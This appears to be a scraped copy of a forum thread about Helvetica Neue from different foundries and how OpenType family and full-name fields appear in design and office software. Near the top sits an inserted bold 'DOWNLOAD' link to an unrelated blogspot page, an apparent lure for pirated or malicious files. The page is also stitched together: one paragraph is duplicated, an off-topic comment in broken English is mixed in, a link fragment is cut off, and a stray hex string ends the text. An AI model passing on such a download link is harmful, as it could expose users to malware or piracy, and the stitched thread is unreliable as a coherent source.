I'm doing a job using Helvetica Neue for a client who has specified that it should be from the Monotype foundry. On checking mine (in Quark's utilities) it says what I'm using is a Adobe Systems Type 1 Postscript font. When I looked online to research about purchasing the Monotype version I keep finding it mostly available as either as Linotype or Adobe but Monotype is really rare, other than from 1 US font site. Certain sites imply that Linotype and Monotype is the same !!! Are they so different from the different foundries that text will reflow quite a bit? It's an expense that I can quite do without if I can help it.
 
**DOWNLOAD 🗸 [https://sioburcietek.blogspot.com/?c=2A0Syh](https://sioburcietek.blogspot.com/?c=2A0Syh)**


 
In addition I find it very confusing that there is a Helvetica Neue Roman AND a Helvetica Neue 55 (or light and 45 etc) in my drop down font menu. Is this because they are from 2 different foundries that has mixed up in my system? Sometimes when I get work back having used the '55', I find that it's been changed to the 'roman' version and I need to change it back again. I am concerned that if I use the Monotype version it'll add another layer of problem to this existing one.
 
Another thing is, sometimes you see the font listed as Neue Helvetica, and Helvetica Neue (reversed order). Other times it's spelt as HelveticaNeue with no space between the 2 words and other times there's a space. It's all very confusing. Again is this because thaey are from different foundries?
 
I have same problem in illustrator,but I don't konw how can fix that font display error，as we can see a lot of file format from different company and they were not compatible well,if one day we use only a kind of software or font they were working good,certainly it was difficult to realization.
 
It sounds like you're concerned about reflowing text, which is an understandable concern. You should be able to test this simply by making a copy of the document and seeing how the text flows with your version of the font.

It also sounds like it's time for you to consider installing some font management software, which will allow you to view font information, activate and deactivate fonts, etc. Personally, I think Linotype FontExplorer Pro is easy to work with, flexible, and has a lot of nice features.
 
I have the same 14 fonts that Old Bruce shows, and while the Apple versions do not have the same features as modern versions (e.g. the Pro flavor that you are considering), they do come with Cyrillic and Greek character sets that are not available in Pro versions.
 
EDIT: The screenshot you provided shows that you have 12 styles of the Apple version, perhaps two are conflicting with the version you had tried to install and therefore are not included. Try what happens after you have removed installation of the "rogue" version.
 
Monotype support person could not unfortunately provide much help. I think the single crucial question to ask them would be asking what is the exact family name of the font that is displayed when the font is selected on macOS. It must be something different than Helvetica Neue. E.g. Helvetica Neue Pro would suffice, or Heveltica Neue LT, or anything that helps them to become a family of their own.
 
OMG, it is unbelievable the Monotype/MyFonts.com customer support should give answers like this (and that the web site shows the full name as family name and the PostScript name as the full font name, as in the screenshot you provided). This is a single font name, while what you would need to know is the common family name that the fonts in this package have. It is hopefully something like Helvetica Neue Pro...
 
When I yesterday visited MyFonts.com and Linotype.com, I visited these same tech info pages which are fine as per font, but the actual family name is not shown anywhere (the name that is shown on the web site as the common name is not necessarily the same as the actual familyname used in fonts, so e.g. for these fonts the name shown on the web page is "Neue Helvetica" (followed by "Pro", "Paneuropean", "World", etc., while the actual familyname is reversed, e.g. for the "World" version it is "Helvetica Neue World". It would be important to anyone on macOS that the familyname is something else then "Helvetica Neue".
 
When I yesterday visited MyFonts.com and Linotype.com, I visited these same tech info pages which are fine as per font, but the actual family name is not shown anywhere (the name that is shown on the web site as the common name is not necessarily the same as the actual familyname used in fonts, so e.g. for these fonts the name shown on the web page is "Neue Helvetica" (followed by "Pro", "Paneuropean", "World", etc., while the actual familyname is reversed, e.g. for the "World" version it is "Helvetica Neue World". If would be important to anyone on macOS that the familyname is something else then "Helvetica Neue".
 
**Full Font Name** is exactly that - Full font name (Name ID 4)
Sometimes that is the same as PostScript Name (Name ID 6).
Sometimes it is not the same - like in your image above for Helvetica Neue World.
And you can see the correct Full Font Name for that font on MyFonts here:
 -helvetica-world-font-linotype?tab=techSpecs
 
More advanced DTP applications such as APub typically use the
Typographic Family name (Name ID 16) - what you see in the Font Family list, and
Typographic Subfamily name (Name ID 17) - which are the Font Styles.
 
Not a good idea to try compare the naming of various Helvetica families as they have been released different times and some old bad ideas have been rectified, and some of them are configured quite differently.

 
MyFonts.com seems to state (according to the screenshot provided by OP) that the "Family Name" of "Neue Helvetica 55 Roman" (that is, a single font that belongs to the basic Pro value package of the referred font family) is "HelveticaNeueLT Pro 55 Roman". That certainly cannot be the family name in the sense of group name shown in the screenshot I made from FontLab.
 
I do not have big complaints about information stated here. It seems to be accurate enough (though I am not sure what is actually meant by "PostScript Full name", it is basically what FontLab mentions as "Full name"). But what it misses is the "Family name" under which the font will be grouped when shown in font menus in apps like InDesign and Affinity apps, disregarding whether on Windows or on macOs. What Word or LibreOffice displays, I could not care less.
 
UPDATE2: Just as a side note: it is remarkable that the font industry keeps on having confused font terminology even after everything seems to have become in hands of Monotype. I can understand that there are language and culturally dependent barriers, but if "Family name" needs to be referred to with some font-nerdy ID to be fully understandable, it seems that the business still needs more monocultural actions to become communicable.
 
For the millions of Windows users viewing MyFonts that is the appropriate family name.
My point is that the information is not wrong.
Just perhaps not the most useful for the users of DTP software.
Certainly the info could be a bit more complete, and better labeled for all users.
But really, what is value of this to the average user?
When I am trying to figure something out like this, I need to see it all.
Would dumping the entire name table in there be useful, or just more confusing?
Even putting the two main "family names" could be counter productive.
For the main users of those websites.
 
FontLab now uses the Typographic Family Name (ID 16) as its base font name.
Glyphs App now does the same.
Must if you want to support single source development of variable and multiple weight families.
FontCreator used Font Family Name (ID 1) as its base font name all the way up to v13 - then when v14 added support for variable fonts, and they changed to using Typographic Family Name (ID 16) as the base font name.
 
I see. But the focus in this thread was on Affinity apps and what works and does not work there. In this context the "Family name" referred in FontLab and Glyphs is crucial. Everything else (and I can understand that there is much else) just blurs the discussion.
 
I don't even understand how I have not been suffering from this (probably because I use Word and LibreOffice Writer just as tools for preparation of text for layout so the font used in context is typically Times New Roman, and that's as far as I am going with these apps). I am far from being a macOS fanboy, but this really, really sucks... So in practise there does not seem to be such concept as family name in non-DTP related Windows apps even such as Word or LibreOffice Writer (just a menu name and the old-school R/I/B/BI grouping). This of course has not been an issue in any graphic design related apps where developer has bothered to see the "extra trouble" of actually using the available API to provide this additional information. I have myself created font related Windows apps and I know that true typographic family names saved as part of font meta data can be read with in-built font APIs of Windows SDKs, starting from something like Windows 95. There can be no excuse for letting font listing stay this elementary in current Office apps. Microsoft, please consult your OpenType font development partner Adobe!
 a2f82b0cb4
 
